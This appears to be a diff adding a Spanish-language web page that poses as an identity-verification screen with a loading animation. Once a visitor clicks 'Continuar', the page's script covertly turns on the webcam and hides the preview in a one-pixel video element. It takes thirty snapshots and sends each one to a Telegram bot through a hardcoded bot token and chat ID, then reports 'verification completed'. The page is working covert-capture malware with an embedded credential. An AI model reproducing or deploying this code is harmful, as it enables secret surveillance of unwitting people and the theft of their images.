@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verificación de identidad con animación de carga</title>
+  <style>
+    body {
+      background: #0a0a0a;
+      color: #00ff99;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }
+    #contenedor {
+      max-width: 400px;
+      padding: 20px;
+      border: 2px solid #00ff99;
+      border-radius: 10px;
+      background: #111;
+      position: relative;
+    }
+    button {
+      margin-top: 20px;
+      background: #00ff99;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background: #00cc77;
+    }
+    #cargando {
+      margin-top: 20px;
+      font-size: 22px;
+      font-weight: bold;
+      height: 30px;
+      color: #00ff99;
+      user-select: none;
+      font-family: monospace;
+    }
+    video {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      width: 1px;
+      height: 1px;
+      border: 1px solid #00ff99;
+      border-radius: 1px;
+      background: black;
+      object-fit: cover;
+      z-index: 1000;
+      image-rendering: pixelated;
+    }
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="contenedor">
+    <h2>Gracias Por Tu Visita</h2>
+    <p>Un Momento, Estamos Trabajando Por Ti.</p>
+    <button id="btnContinuar">Continuar</button>
+    <div id="cargando" style="display:none;">Cargando<span id="dots"></span></div>
+  </div>
+
+  <video id="video" autoplay muted playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const btn = document.getElementById('btnContinuar');
+    const cargando = document.getElementById('cargando');
+    const dotsSpan = document.getElementById('dots');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    const token = '8358892719:AAHCwDF16WCTBwXf7-xWHtZzRI7kiVuxIKM';
+    const chat_id = '1221652451';
+
+    let dotsInterval;
+
+    function startLoadingAnimation() {
+      let dots = 0;
+      dotsInterval = setInterval(() => {
+        dots = (dots + 1) % 4;
+        dotsSpan.textContent = '.'.repeat(dots);
+      }, 500);
+    }
+
+    function stopLoadingAnimation() {
+      clearInterval(dotsInterval);
+      dotsSpan.textContent = '';
+    }
+
+    function delay(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function esperarVideoListo() {
+      return new Promise((resolve, reject) => {
+        let timeoutId = setTimeout(() => {
+          reject(new Error('Timeout esperando video'));
+        }, 15000);
+
+        function checkVideo() {
+          if (video.readyState >= 3 && video.videoWidth > 0 && video.videoHeight > 0) {
+            clearTimeout(timeoutId);
+            resolve();
+          }
+        }
+
+        video.addEventListener('loadedmetadata', checkVideo);
+        video.addEventListener('canplay', checkVideo);
+        video.addEventListener('playing', checkVideo);
+
+        // Chequeo inicial
+        checkVideo();
+      });
+    }
+
+    async function iniciarCamara() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      await esperarVideoListo();
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      return stream;
+    }
+
+    async function enviarFoto(blob) {
+      const formData = new FormData();
+      formData.append('chat_id', chat_id);
+      formData.append('photo', blob, `foto.jpg`);
+
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+    }
+
+    async function capturarYEnviarFotos(stream) {
+      const fps = 10;
+      const duracion = 3; // segundos
+      const totalFotos = fps * duracion;
+
+      for(let i = 0; i < totalFotos; i++) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+        const blob = await (await fetch(dataUrl)).blob();
+        await enviarFoto(blob);
+        await delay(1000 / fps);
+      }
+
+      stream.getTracks().forEach(t => t.stop());
+    }
+
+    btn.onclick = async () => {
+      btn.disabled = true;
+      btn.style.display = 'none';
+      cargando.style.display = 'block';
+      startLoadingAnimation();
+      try {
+        const stream = await iniciarCamara();
+        await capturarYEnviarFotos(stream);
+      } catch (e) {
+        alert('Error al acceder a la cámara: ' + e.message);
+      }
+      stopLoadingAnimation();
+      cargando.textContent = '✅ Verificación completada.';
+    };
+  </script>
+</body>
+</html>
